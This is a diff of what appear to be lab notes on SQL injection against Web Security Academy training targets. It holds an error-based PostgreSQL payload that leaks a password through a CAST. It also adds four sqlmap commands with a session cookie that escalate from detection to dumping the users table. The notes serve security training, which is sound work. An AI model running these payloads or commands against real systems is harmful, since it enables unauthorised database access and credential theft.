@@ -9,6 +9,25 @@ location='https://0a7c00030469134c80543acb00690098.web-security-academy.net/?Sea
 2.
 payload: `CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)`
 
+tool
+
+```bash
+python sqlmap.py -u 'https://0a48002f03d9345f80cd039700ed00a0.web-security-academy.net/advanced_search?SearchTerm=a&organize_by=*&blogArtist=' --cookie='session=c73gpxIvoomYTmECIzBVyTl6ZVrDGOd3' --batch --level=5 --risk=3 --dbms="PostgreSQL"
+```
+
+```bash
+python sqlmap.py -u 'https://0a48002f03d9345f80cd039700ed00a0.web-security-academy.net/advanced_search?SearchTerm=a&organize_by=*&blogArtist=' --cookie='session=c73gpxIvoomYTmECIzBVyTl6ZVrDGOd3' --batch --level=5 --risk=3 --dbms="PostgreSQL" --dbs
+```
+
+```bash
+python sqlmap.py -u 'https://0a48002f03d9345f80cd039700ed00a0.web-security-academy.net/advanced_search?SearchTerm=a&organize_by=*&blogArtist=' --cookie='session=c73gpxIvoomYTmECIzBVyTl6ZVrDGOd3' --batch --level=5 --risk=3 --dbms="PostgreSQL" -D public --tables
+```
+
+```bash
+python sqlmap.py -u 'https://0a48002f03d9345f80cd039700ed00a0.web-security-academy.net/advanced_search?SearchTerm=a&organize_by=*&blogArtist=' --cookie='session=c73gpxIvoomYTmECIzBVyTl6ZVrDGOd3' --batch --level=5 --risk=3 --dbms="PostgreSQL" -D public -T users --dump
+```
+
+
 3. 
 
 payload 
